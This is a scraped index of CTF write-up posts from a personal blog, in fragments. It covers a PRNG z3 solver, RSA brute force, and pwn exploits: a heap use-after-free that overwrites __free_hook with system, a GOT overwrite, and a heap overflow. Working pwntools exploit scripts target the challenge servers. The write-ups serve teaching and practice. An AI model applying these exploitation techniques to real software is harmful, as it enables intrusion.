100000 calls. From observation, it is just linear equations, and it seems like even though what we got is only partial sequences, I think it shold be enough to recover needed internal states to generate the random number those are xored with the flag chunks. Because I‚Äôm too lazy, well let‚Äôs simply try to solve it with the help of z3 üòÉ. Turn out, z3 is only able to find some internal states of the vec, but this is enough to generate the 4 random values those are xored with the flag chunks. Below is the full solver script from Crypto.Util.number import * from z3 import * leaked = [1967981989159506896, 12417576839900903143, 5391827788107581754, 9211837354618349619, 11911979448172444251, 436461377053033951, 8394439408169944148, 9103763829763273513, 7101121394772592963, 18180164424805091773, 10980218005670728650, 3592195252851566282, 15982088259081365278, 18366993356901645139, 16470043187318505301, 12529639613890366320, 5405453295559550962, 3219566894479483465, 16987169033331910230, 9344236955639961560, 3745615208872438517, 3388187019357417407, 17198114806622348859, 9334174653951229381, 1009948000446937143, 14650385610612467309, 14912852548935159537, 8230750145803377492, 13210874570097825431, 4261899336407377866, 2573134042538913249, 10562921983129619234, 4481733723106553150, 6693876041704064709, 13772536884257081061, 4814655535784567940, 17117043381738664412, 10014777550587990992, 7013436321029132294, 953436847296933558, 13864297711807309149, 11312345922389074726, 2199867878612078091, 8402220611296899976, 10378165238796511161, 16078363467890630054, 7098501269083835059, 1681679444219081187, 17235013401211119472, 2203917752371077442, 9217070900827478302, 10058277698897632667, 15972660907870375806, 6622838346930090221, 12586537260105593109, 6433719167686925168, 3032065173778278418, 9743104590135308267, 7391368162387036788, 10725912781903875779, 9846554056484719855, 12343982921622455581, 36206366241642941, 11813694384750487006, 5494944593056217372, 17617075954936948791, 15958686524489577932, 11727447540781267578, 13380151820153190493, 9349098470649357156, 13803047902546235975, 17286479261703485395, 14722281154768715543, 12612473994461271801, 14312822945784769203, 15609063854644643395, 14708036210562969600, 13796313732450064136, 10307023727568972101, 17513680648877824019, 16702438782110391465, 3652001414219721007, 5265625636739631457, 10654632704447374504, 7511078814006349210, 9140982706528528010, 16223838721279393322, 10420524606533750516, 16701377323767306114, 3750804369080437426, 1274885552917066026, 4230518916834636384, 6690624599507792675, 15478451784117638719, 13534840562459518131, 12163976775461276142, 9476524941230848424, 1443362190438042863, 1456911544696158525, 13438749309336286137, 13766436007254005985, 8432370224361500748, 3203865476118736526, 4420206307832455609, 10496653657337759511, 2775211754574419515, 16696355141624962972, 16768338839510607900, 10202318454385533892, 12554418635459033218, 1708421080877496043, 11341735535211029325, 13622421994908208944, 16469847339176897411, 10935449642259488944, 5989762449076810195, 16678533334885732063, 9391936203669602898, 15958497913540135719, 15152164795107255721, 17424538298476802068, 13476846617758916522, 15469288240231942444, 1042058457773191313, 1437682614378048888, 7791872198157832698, 3337812416348112405, 1784790255299050697, 17002639445141763699, 12767980465486129482, 17612162068890083773, 16407551756979473","date":"May 05, 2022","objectID":"/posts/angstrom-ctf-2022/:1:3","tags":["Writeup","AngstromCTF","PRNG","crypto","2022"],"title":"Angstrom CTF 2022","uri":"/posts/angstrom-ctf-2022/"},{"categories":null,"content":" I tried to spend my saturday to do the NahamCon CTF 2022, but I had a lot of events during the day, so I plan to look at 3-5 problems. At the end, I could only solve one problem that I looked first, because it turns out to be pretty hard for me. I‚Äôm still new to this, so I would like to apologize in advance if there is wrong or misleading information stated in here. Feel free to contact me if you find mistakes in my writeup. Cheers üçª Pwn ","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:0:0","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"Free Real Estate ","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:1:0","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"Intro We were given two files, the Dockerfile and a binary called free_real_estate. Let‚Äôs try to run the binary first. ./free_real_estate Enter your name: lmao Hello: lmao! [1] Show property [2] Add property [3] Remove property [4] Edit property [5] Change name [6] Exit \u003e Seems like we will be working with heap (Well, the name of the challenge is free though) ","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:1:1","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"Initial Analysis Let‚Äôs grab the libc file first by turning up the docker based on the given Dockerfile. Checking on the libc file, the glibc is glibc-2.31, which mean we couldn‚Äôt do double free. Checksec of the binary: Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Now, turning up our decompiler, let‚Äôs try to decompile it and breakdown some important functions. main undefined8 main(void) { bool bVar1; char *pcVar2; undefined4 uVar3; size_t sVar4; bVar1 = false; setbuf(stdin,(char *)0x0); setbuf(stdout,(char *)0x0); printf(\"Enter your name: \"); username._8_8_ = getline((char **)username,(size_t *)(username + 8),stdin); pcVar2 = username._0_8_; sVar4 = strcspn(username._0_8_,\"\\n\"); pcVar2[sVar4] = '\\0'; username._8_8_ = username._8_8_ + -1; printf(\"Hello: %s!\\n\\n\",username._0_8_); while (!bVar1) { uVar3 = menu(); switch(uVar3) { case 0: if (property == 0) { puts(\"You do not own any property.\"); } else { show_property(); } break; case 1: if (property == 0) { add_property(); } else { puts(\"You already own property.\"); } break; case 2: if (property == 0) { puts(\"You do not own any property.\"); } else { remove_property(); } break; case 3: if (property == 0) { puts(\"You do not own any property.\"); } else { edit_property(); } break; case 4: change_name(); break; default: bVar1 = true; } puts(\"\"); } return 0; } Okay, so we have like 5 functions that we can use, and we can only add property only after removing it. add_property void add_property(void) { long lVar1; void *pvVar2; size_t sVar3; long in_FS_OFFSET; char local_21; long local_20; void *_property; local_20 = *(long *)(in_FS_OFFSET + 0x28); local_21 = '\\0'; property = malloc(0x40); if (property == (void *)0x0) { puts(\"Failed to allocate memory for the property\"); /* WARNING: Subroutine does not return */ exit(1); } printf(\"Enter the house number: \"); __isoc99_scanf(\u0026fmt_d,(long)property + 0x18); getchar(); printf(\"What is the length of the street name: \"); __isoc99_scanf(\u0026fmt_zu); getchar(); _property = property; pvVar2 = malloc(*(long *)((long)property + 0x28) + 1); *(void **)((long)_property + 0x20) = pvVar2; if (*(long *)((long)property + 0x20) == 0) { puts(\"Failed to allocate memory for the street name\"); /* WARNING: Subroutine does not return */ exit(1); } printf(\"Enter the street name: \"); fgets(*(char **)((long)property + 0x20),(int)*(undefined8 *)((long)property + 0x28),stdin); lVar1 = *(long *)((long)property + 0x20); sVar3 = strcspn(*(char **)((long)property + 0x20),\"\\n\"); *(undefined *)(sVar3 + lVar1) = 0; printf(\"What is the price of the property?: \"); __isoc99_scanf(\u0026fmt_lf,(long)property + 0x10); getchar(); printf(\"Would you like to add a comment for this property? [y/n]: \"); __isoc99_scanf(\u0026DAT_00102133,\u0026local_21); getchar(); if (local_21 == 'y') { printf(\"What is the length of the comment?: \"); __isoc99_scanf(\u0026fmt_zu); getchar(); _property = property; pvVar2 = malloc(*(long *)((long)property + 0x38) + 1); *(void **)((long)_property + 0x30) = pvVar2; if (*(long *)((long)property + 0x30) == 0) { puts(\"Failed to allocate memory for the comment\"); /* WARNING: Subroutine does not return */ exit(1); } printf(\"Enter the comment: \"); fgets(*(char **)((long)property + 0x30),(int)*(undefined8 *)((long)property + 0x38),stdin); lVar1 = *(long *)((long)property + 0x30); sVar3 = strcspn(*(char **)((long)property + 0x30),\"\\n\"); *(undefined *)(sVar3 + lVar1) = 0; } if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } Okay, so when we add a new property, important things that we do: malloc(0x40) for property object We can malloc street name with any size And we store the given size inside the property object We can malloc comment with any size And we store the given size inside the property object edit_property void edit_property(void) { void *pvVar1; size_t sVar2; long in_FS_OFFSET; char local_29; ulong input_size; long local_20; long _property; local_20 = *(long *","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:1:2","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"Exploitation Plan Okay, so important points that we can conclude from our initial analysis: We can malloc chunk with any size Hence, we can freed a chunk to unsorted bin by malloc large chunk There is Use-After-Free (UAF) bug on the comment, where we can see the freed chunk, and edit it via edit_property Seems like the rough plan is pretty clear. We can leak libc address by leveraging the UAF bug in the comment objectt. And then we need to be able to overwrite __free_hook by system to trigger a shell. ","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:1:3","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"Solution Okay, so now I will explain my solution on this challenge. Let‚Äôs define helper in our script first to help our life easier. def add_property(r, lsn, sn, lc, comment=''): r.sendlineafter(b'\u003e ', b'2') r.sendlineafter(b'Enter the house number: ', str(10).encode()) # Isn't useful. Just set any value. r.sendlineafter(b'What is the length of the street name: ', str(lsn).encode()) r.sendlineafter(b'Enter the street name: ', sn) r.sendlineafter(b'What is the price of the property?: ', str(10).encode()) # Isn't useful. Just set any value. if lc == 0: r.sendlineafter(b'Would you like to add a comment for this property? [y/n]: ', b'n') else: r.sendlineafter(b'Would you like to add a comment for this property? [y/n]: ', b'y') r.sendlineafter(b'What is the length of the comment?: ', str(lc).encode()) r.sendlineafter(b'Enter the comment: ', comment) def edit_property(r, lsn, sn, lc, comment='', change_comment=False, is_free_hook_overwritted=False): r.sendlineafter(b'\u003e ', b'4') r.sendlineafter(b'Would you like to change the house number? [y/n]: ', b'n') # Isn't useful. No need to edit. if lsn == 0: r.sendlineafter(b'Would you like to change the street? [y/n]: ', b'n') else: r.sendlineafter(b'Would you like to change the street? [y/n]: ', b'y') r.sendlineafter(b'Enter the new street name length: ', str(lsn).encode()) r.sendlineafter(b'Enter the new street name: ', sn) r.sendlineafter(b'Would you like to change the price of the property? [y/n]: ', b'n') # Isn't useful. No need to edit. if lc == 0: r.sendlineafter(b'Would you like to change the comment? [y/n]: ', b'n') else: if not change_comment: r.sendlineafter(b'Would you like to add a comment for this property? [y/n]: ', b'y') r.sendlineafter(b'What is the length of the comment?: ', str(lc).encode()) r.sendlineafter(b'Enter the comment: ', comment) else: r.sendlineafter(b'Would you like to change the comment? [y/n]: ', b'y') r.sendlineafter(b'Enter the new comment length: ', str(lc).encode()) if is_free_hook_overwritted: # No need to enter new comment, as we have overwritten it with system return r.sendlineafter(b'Enter the new comment: ', comment) def remove_property(r): r.sendlineafter(b'\u003e ', b'3') def show_property(r): r.sendlineafter(b'\u003e ', b'1') r.recvline().strip() r.recvline().strip() r.recvline().strip() r.recvline().strip() r.recvline().strip() comment = r.recvline().strip().split(b': ')[1] # We only care the comment value return comment def change_username(r, ln, name): r.sendlineafter(b'\u003e ', b'5') r.sendlineafter(b'What is the length of your new name?: ', str(ln).encode()) r.sendlineafter(b'Enter your new name: ', name) Part 1: Leak Libc Address Okay, so now let‚Äôs try to fire up our GDB to have a better visualization on the heap. Let‚Äôs start the program by initializing our name r = conn() # After first connection, by default the binary will call malloc(0x40) # and use this heap chunk for property variable r.sendlineafter(b'Enter your name: ', p64(0xdeadbeef)) Below is the heap after we initialize our name 0x55802d04d290 0x0000000000000000 0x0000000000000081 ................ 0x55802d04d2a0 0x00000000deadbeef 0x000000000000000a ................ 0x55802d04d2b0 0x0000000000000000 0x0000000000000000 ................ 0x55802d04d2c0 0x0000000000000000 0x0000000000000000 ................ 0x55802d04d2d0 0x0000000000000000 0x0000000000000000 ................ 0x55802d04d2e0 0x0000000000000000 0x0000000000000000 ................ 0x55802d04d2f0 0x0000000000000000 0x0000000000000000 ................ 0x55802d04d300 0x0000000000000000 0x0000000000000000 ................ 0x55802d04d310 0x0000000000000000 0x0000000000020cf1 ................ \u003c-- Top chunk Now, we need to free a chunk to unsorted bin. Simply malloc a large chunk and free it. add_property(r, 0x10, b'lmao', 0x427, b'lmao') edit_property(r, 0x20, b'lmao', 0) remove_property(r) What we want to achieve on here is: Create a large chunk in comment Alloc a new chunk below it to prevent consolidation Freed all the object After freed","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:1:4","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"Final script from pwn import * from pwn import p64, u64, p32, u32 context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") exe = ELF(\"./free_real_estate\") libc = ELF(\"./libc-2.31.so\") ld = ELF(\"./ld-2.31.so\") main_arena = 0x1ecb80 context.binary = exe def conn(): print(args) if args.LOCAL: r = process([exe.path]) if args.PLT_DEBUG: gdb.attach(r) else: r = remote(\"challenge.nahamcon.com\", 32491) return r def add_property(r, lsn, sn, lc, comment=''): r.sendlineafter(b'\u003e ', b'2') r.sendlineafter(b'Enter the house number: ', str(10).encode()) # Isn't useful. Just set any value. r.sendlineafter(b'What is the length of the street name: ', str(lsn).encode()) r.sendlineafter(b'Enter the street name: ', sn) r.sendlineafter(b'What is the price of the property?: ', str(10).encode()) # Isn't useful. Just set any value. if lc == 0: r.sendlineafter(b'Would you like to add a comment for this property? [y/n]: ', b'n') else: r.sendlineafter(b'Would you like to add a comment for this property? [y/n]: ', b'y') r.sendlineafter(b'What is the length of the comment?: ', str(lc).encode()) r.sendlineafter(b'Enter the comment: ', comment) def edit_property(r, lsn, sn, lc, comment='', change_comment=False, is_free_hook_overwritted=False): r.sendlineafter(b'\u003e ', b'4') r.sendlineafter(b'Would you like to change the house number? [y/n]: ', b'n') # Isn't useful. No need to edit. if lsn == 0: r.sendlineafter(b'Would you like to change the street? [y/n]: ', b'n') else: r.sendlineafter(b'Would you like to change the street? [y/n]: ', b'y') r.sendlineafter(b'Enter the new street name length: ', str(lsn).encode()) r.sendlineafter(b'Enter the new street name: ', sn) r.sendlineafter(b'Would you like to change the price of the property? [y/n]: ', b'n') # Isn't useful. No need to edit. if lc == 0: r.sendlineafter(b'Would you like to change the comment? [y/n]: ', b'n') else: if not change_comment: r.sendlineafter(b'Would you like to add a comment for this property? [y/n]: ', b'y') r.sendlineafter(b'What is the length of the comment?: ', str(lc).encode()) r.sendlineafter(b'Enter the comment: ', comment) else: r.sendlineafter(b'Would you like to change the comment? [y/n]: ', b'y') r.sendlineafter(b'Enter the new comment length: ', str(lc).encode()) if is_free_hook_overwritted: # No need to enter new comment, as we have overwritten it with system return r.sendlineafter(b'Enter the new comment: ', comment) def remove_property(r): r.sendlineafter(b'\u003e ', b'3') def show_property(r): r.sendlineafter(b'\u003e ', b'1') r.recvline().strip() r.recvline().strip() r.recvline().strip() r.recvline().strip() r.recvline().strip() comment = r.recvline().strip().split(b': ')[1] # We only care the comment value return comment def change_username(r, ln, name): r.sendlineafter(b'\u003e ', b'5') r.sendlineafter(b'What is the length of your new name?: ', str(ln).encode()) r.sendlineafter(b'Enter your new name: ', name) r = conn() # After first connection, by default the binary will call malloc(0x40) # and use this heap chunk for property variable r.sendlineafter(b'Enter your name: ', p64(0xdeadbeef)) ''' Part 1: Leak Libc base address ''' # Create big chunk for Comment # Chunk-1: Street name # Chunk-2: Comment add_property(r, 0x10, b'lmao', 0x427, b'lmao') # Prevent consolidate # Chunk-1 got freed -\u003e tcache # Chunk-3: Street name edit_property(r, 0x20, b'lmao', 0) # Free all # Chunk-2 got freed -\u003e unsorted_bin due to its large size # Chunk-3 got freed -\u003e Tcache remove_property(r) # Due to bug on remove_property, even though we create a new property without comment, # the property's comment still point to the freed chunk, hence we can leak libc address # via show_property due to the fact that unsorted_bin point to libc main_arena + 0x60. # Create new property without comment \u0026 show its property add_property(r, 0x10, b'lmao', 0) leaked_libc = u64(show_property(r).ljust(8, b'\\x00')) log.info(f'leaked_libc: {hex(leaked_libc)}') libc_base = leaked_libc - ","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:1:5","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"Social Media Follow me on twitter ","date":"May 01, 2022","objectID":"/posts/nahamcon-ctf-2022/:2:0","tags":["Writeup","NahamConCTF","heap","pwn","2022"],"title":"NahamCon CTF 2022","uri":"/posts/nahamcon-ctf-2022/"},{"categories":null,"content":"For this CTF, I managed to solve two challenges only. I hope I can do better in the next CTF. Pwn ","date":"Mar 11, 2022","objectID":"/posts/zer0pts-ctf-2022/:0:0","tags":["Writeup","zer0pts","pwn","short-overflow","got-overwrite","RSA","Fermat","crypto","2022"],"title":"zer0pts CTF 2022","uri":"/posts/zer0pts-ctf-2022/"},{"categories":null,"content":"Modern-Rome We were given a binary compiled from cpp file. Below is the cpp file. #include \u003cstring\u003e #include \u003ciostream\u003e short buf[10]; void win() { std::system(\"/bin/sh\"); } short readroman(){ short res = 0; std::string s; std::cin \u003e\u003e s; auto it = s.crbegin(); int b = 1; for (auto c: \"IXCM\") { int cnt = 0; while (cnt \u003c 9 \u0026\u0026 it != s.crend() \u0026\u0026 *it == c) { it++; cnt++; } res += b * cnt; b *= 10; } return res; } int main() { std::setbuf(stdin, NULL); std::setbuf(stdout, NULL); std::cout \u003c\u003c \"ind: \"; int ind = readroman(); std::cout \u003c\u003c \"val: \"; int val = readroman(); std::cout \u003c\u003c \"buf[\" \u003c\u003c ind \u003c\u003c \"] = \" \u003c\u003c val \u003c\u003c std::endl; buf[ind] = val; std::exit(0); } Checksec result Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) From the given file, some notes that we can take: No PIE, so we don‚Äôt need to look for the base address of the binary. There is win function, which clearly our goal is to call this function. buf is array of short (2 bytes), which is located in the .data segment (precisely at 0x404340). The program is receiving a roman number, which will convert it to integer. We can set buf[index] = value, where we control the index and value. There isn‚Äôt boundary check for the index At a glance, seems like there isn‚Äôt anything wrong with the code. But there is a subtle bug on there. See the roman conversion method below: short readroman(){ short res = 0; std::string s; std::cin \u003e\u003e s; auto it = s.crbegin(); int b = 1; for (auto c: \"IXCM\") { int cnt = 0; while (cnt \u003c 9 \u0026\u0026 it != s.crend() \u0026\u0026 *it == c) { it++; cnt++; } res += b * cnt; b *= 10; } return res; } The first idea is of course to overflow the res variable. In order to do that, we need to be able to send Roman value larger than $32767$. However, it seems like impossible to do that, because seems like the maximum value that can be returned by the readroman function is $9999$. In C, string is ended with \\0, which mean during iterating string ‚ÄúIXCM‚Äù with auto, \\0 will be iterated also, henc the maximum value that can be returned by the method is not $9999$, but $99999$, which is enough to overflow the res variable. My solution is to overwrite the GOT value of exit by win address. The exit GOT location is at 0x404058, which mean to overwrite it, we will need to assign the win address value to buf[(0x404340 - 0x404058) // 2] (Need to divide it by $2$ because buf is array of short type element). Also another note is that, we only need to overwrite the last two-bytes of the exit GOT value (because the third lsb is already the same, which is 0x40) Below is the solver: from pwn import * from pwn import p64, u64, p32, u32 context.arch = 'amd64' context.encoding = 'latin' context.log_level = 'INFO' warnings.simplefilter(\"ignore\") offset = b'\\x00'*6+b'M'*5+b'C'*1+b'X'*6+b'I'*4 win = b'M'*4+b'C'*8+b'X'*5+b'I'*4 r = remote('pwn1.ctf.zer0pts.com', 9000) r.sendlineafter(b'ind: ', offset) r.sendlineafter(b'val: ', win) r.interactive() Flag: zer0pts{R0me_w1ll_3x1st_a5_1on9_4s_th3_Col1s3um_d0es} Crypto ","date":"Mar 11, 2022","objectID":"/posts/zer0pts-ctf-2022/:1:0","tags":["Writeup","zer0pts","pwn","short-overflow","got-overwrite","RSA","Fermat","crypto","2022"],"title":"zer0pts CTF 2022","uri":"/posts/zer0pts-ctf-2022/"},{"categories":null,"content":"Anti-Fermat Below is the source code of the chall: from Crypto.Util.number import isPrime, getStrongPrime from gmpy import next_prime from secret import flag # Anti-Fermat Key Generation p = getStrongPrime(1024) q = next_prime(p ^ ((1\u003c\u003c1024)-1)) n = p * q e = 65537 # Encryption m = int.from_bytes(flag, 'big') assert m \u003c n c = pow(m, e, n) print('n = {}'.format(hex(n))) print('c = {}'.format(hex(c))) Through observations, we can see that $p+q$ value is actually bruteforce-able. If we see on how $q$ is generated, $q$ is basically we flip $p$ bits and increase it until it is a prime. So, $$ p + q = (1 ¬´ 1024) + x $$ where $x$ is small. Notes that we can get the $\\varphi(n)$ value if we know $p+q$. See below equation: $$ \\begin{align} \\varphi(n) \u0026= (p-1)*(q-1)\\\\ \u0026= pq - (p+q) + 1\\\\ \\end{align} $$ To solve this chall, we just need to bruteforce $p+q$ based on first equation, and then try to decrypt the $c$ with the calculated $\\varphi(n)$. Below is my solver (I use sagemath). from Crypto.Util.number import * e = 65537 n = 0x1ffc7dc6b9667b0dcd00d6ae92fb34ed0f3d84285364c73fbf6a572c9081931be0b0610464152de7e0468ca7452c738611656f1f9217a944e64ca2b3a89d889ffc06e6503cfec3ccb491e9b6176ec468687bf4763c6591f89e750bf1e4f9d6855752c19de4289d1a7cea33b077bdcda3c84f6f3762dc9d96d2853f94cc688b3c9d8e67386a147524a2b23b1092f0be1aa286f2aa13aafba62604435acbaa79f4e53dea93ae8a22655287f4d2fa95269877991c57da6fdeeb3d46270cd69b6bfa537bfd14c926cf39b94d0f06228313d21ec6be2311f526e6515069dbb1b06fe3cf1f62c0962da2bc98fa4808c201e4efe7a252f9f823e710d6ad2fb974949751 c = 0x60160bfed79384048d0d46b807322e65c037fa90fac9fd08b512a3931b6dca2a745443a9b90de2fa47aaf8a250287e34563e6b1a6761dc0ccb99cb9d67ae1c9f49699651eafb71a74b097fc0def77cf287010f1e7bd614dccfb411cdccbb84c60830e515c05481769bd95e656d839337d430db66abcd3a869c6348616b78d06eb903f8abd121c851696bd4cb2a1a40a07eea17c4e33c6a1beafb79d881d595472ab6ce3c61d6d62c4ef6fa8903149435c844a3fab9286d212da72b2548f087e37105f4657d5a946afd12b1822ceb99c3b407bb40e21163c1466d116d67c16a2a3a79e5cc9d1f6a1054d6be6731e3cd19abbd9e9b23309f87bfe51a822410a62 base = 1\u003c\u003c1024 # Bruteforce p+q value for i in range(0, 10000000, 1): print(f'Curr x: {i}') phi = n - (base+i) + 1 d = inverse_mod(e, phi) flag = long_to_bytes(int(pow(c, d, n))) if b'pts' in flag: print(f'Flag: {flag.decode()}') exit() Flag: zer0pts{F3rm4t,y0ur_m3th0d_n0_l0ng3r_w0rks.y0u_4r3_f1r3d} ","date":"Mar 11, 2022","objectID":"/posts/zer0pts-ctf-2022/:2:0","tags":["Writeup","zer0pts","pwn","short-overflow","got-overwrite","RSA","Fermat","crypto","2022"],"title":"zer0pts CTF 2022","uri":"/posts/zer0pts-ctf-2022/"},{"categories":null,"content":" I spend my Sunday doing Pragyan CTF 2022. I‚Äôm very grateful that I got 17th place even though I play it solo. Below is my writeup for challenges that I solved and don‚Äôt forget to follow me on Twitter üôÇ Pwn ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:0:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Database ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:1:0","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Intro We were given a binary, let‚Äôs decompile it. Below is the main function. void main(void) { ulong uVar1; long in_FS_OFFSET; char local_18 [8]; undefined8 local_10; local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28); fflush(stdin); welcome(); fprintf(stderr,\"This might help: %p\\n\",main); do { menu(); read(0,local_18,8); uVar1 = atoll(local_18); switch(uVar1 \u0026 0xffffffff) { default: fwrite(\"Invalid choice\\n\",1,0xf,stderr); break; case 1: print_items(); break; case 2: insert_item(); break; case 3: update_item(); break; case 4: delete_item(); break; case 5: leave(); /* WARNING: Subroutine does not return */ exit(0); } fflush(stdin); } while( true ); } insert_item void insert_item(void) { size_t __size; void *pvVar1; ssize_t sVar2; long in_FS_OFFSET; int local_3c; char local_28 [24]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); if (len \u003c 0x10) { fwrite(\"Please enter the length of string =\u003e \",1,0x25,stderr); read(0,local_28,0xc); __size = atoll(local_28); if (__size == 0) { fwrite(\"Invalid length!\\n\",1,0x10,stderr); } else { for (local_3c = 0; local_3c \u003c 0x10; local_3c = local_3c + 1) { if (*(long *)(data_base + (long)local_3c * 0x10 + 8) == 0) { *(size_t *)(data_base + (long)local_3c * 0x10) = __size; pvVar1 = malloc(__size); *(void **)(data_base + (long)local_3c * 0x10 + 8) = pvVar1; fwrite(\"Please enter the string you want to save =\u003e \",1,0x2c,stderr); sVar2 = read(0,*(void **)(data_base + (long)local_3c * 0x10 + 8),__size); *(undefined *)(sVar2 + *(long *)(data_base + (long)local_3c * 0x10 + 8)) = 0; len = len + 1; break; } } } } else { fwrite(\"Database is full!\\n\",1,0x12,stderr); } if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) { return; } /* WARNING: Subroutine does not return */ __stack_chk_fail(); } delete_item void delete_item(void) { int iVar1; long in_FS_OFFSET; char local_18 [8]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); if (len == 0) { fwrite(\"Database is empty\\n\",1,0x12,stderr); } else { fwrite(\"Please enter the index of element =\u003e \",1,0x25,stderr); read(0,local_18,8); iVar1 = atoi(local_18); if (*(long *)(data_base + (long)iVar1 * 0x10 + 8) == 0) { fwrite(\"Invalid index\\n\",1,0xe,stderr); } else { free(*(void **)(data_base + (long)iVar1 * 0x10 + 8)); *(undefined8 *)(data_base + (long)iVar1 * 0x10 + 8) = 0; *(undefined8 *)(data_base + (long)iVar1 * 0x10) = 0; fwrite(\"Element deleted successfully!\\n\",1,0x1e,stderr); len = len + -1; } } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } update_item void update_item(void) { int iVar1; uint uVar2; ssize_t sVar3; long in_FS_OFFSET; char local_30 [8]; char local_28 [24]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); if (len == 0) { fwrite(\"Database is empty!\\n\",1,0x13,stderr); } else { fwrite(\"Please enter the index of element =\u003e \",1,0x25,stderr); read(0,local_30,8); iVar1 = atoi(local_30); if (*(long *)(data_base + (long)iVar1 * 0x10 + 8) == 0) { fwrite(\"Invalid index\\n\",1,0xe,stderr); } else { fwrite(\"Please enter the length of string =\u003e \",1,0x25,stderr); read(0,local_28,8); uVar2 = atoi(local_28); *(ulong *)(data_base + (long)iVar1 * 0x10) = (ulong)uVar2; fwrite(\"Please enter the string =\u003e \",1,0x1b,stderr); sVar3 = read(0,*(void **)(data_base + (long)iVar1 * 0x10 + 8),(ulong)uVar2); *(undefined *)((long)(int)sVar3 + *(long *)(data_base + (long)iVar1 * 0x10 + 8)) = 0; } } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return; } leave void leave(void) { puts(\"Thanks a lot!\\nGoodbye!\"); return; } There is also secret function which will print the flag void secret(void) { system(\"/bin/cat ./flag\"); return; } Let‚Äôs checksec the binary: Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Okay, PIE is enabled ","date":"Mar 07, 2022","objectID":"/posts/pragyan-ctf-2022/:1:1","tags":["Writeup","PragyanCTF","php","web","z3","crypto","heap","pwn","format string","2022"],"title":"Pragyan CTF 2022","uri":"/posts/pragyan-ctf-2022/"},{"categories":null,"content":"Analysis main // At main function fprintf(stderr,\"This might help: %p\\n\",main); Reading through the code, I notice that the binary leak us the main address, which mean the PIE mitigation isn‚Äôt matter at all. We can calculate the address of available functions, plt, got, etc. insert_item Observation on the insert_item method, we can control the malloc chunk size. delete_item Observation on the delete_item method, the pointer was nulled after free, so we couldn‚Äôt do UAF or Double Free. update_item fwrite(\"Please enter the length of string =\u003e \",1,0x25,stderr); read(0,local_28,8); uVar2 = atoi(local_28); *(ulong *)(data_base + (long)iVar1 * 0x10) = (ulong)uVar2; fwrite(\"Please enter the string =\u003e \",1,0x1b,stderr); sVar3 = read(0,*(void **)(data_base + (long)iVar1 * 0x10 + 8),(ulong)uVar2); *(undefined *)((long)(int)sVar3 + *(long *)(data_base + (long)iVar1 * 0x10 + 8)) = 0; Observation on the update_item method, we can see that there is heap-overflow. Notice that there isn‚Äôt any check on the item‚Äôs size during update. If we put larger size during update than the allocated chunk size, we can overwrite the other chunks value. For example, let say that we insert_item three times with size 0x10. The chunk will be like below. ... 0x555555602290 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022a0 0x6161616161616161 0x0a61616161616161 aaaaaaaaaaaaaaa. 0x5555556022b0 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022c0 0x6262626262626262 0x0a62626262626262 bbbbbbbbbbbbbbb. 0x5555556022d0 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022e0 0x6363636363636363 0x0a63636363636363 ccccccccccccccc. What if we set bigger size during update_item? Then we can overwrite the other chunks which located next to each other. What happen if we free the chunks? It will be put to tcache bins, and then it will maintained a linked-list of the cache. Let say that we free the second and third chunk, the heap will be like below. ... 0x555555602290 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022a0 0x6161616161616161 0x0a61616161616161 aaaaaaaaaaaaaaa. 0x5555556022b0 0x0000000000000000 0x0000000000000021 ........!....... 0x5555556022c0 0x00005555556022e0 0x0000555555602010 .\"`UUU... `UUU.. \u003c-- tcachebins[0x20][0/2] 0x5555556022d0 0x0000000000000000 0x0000000000000021 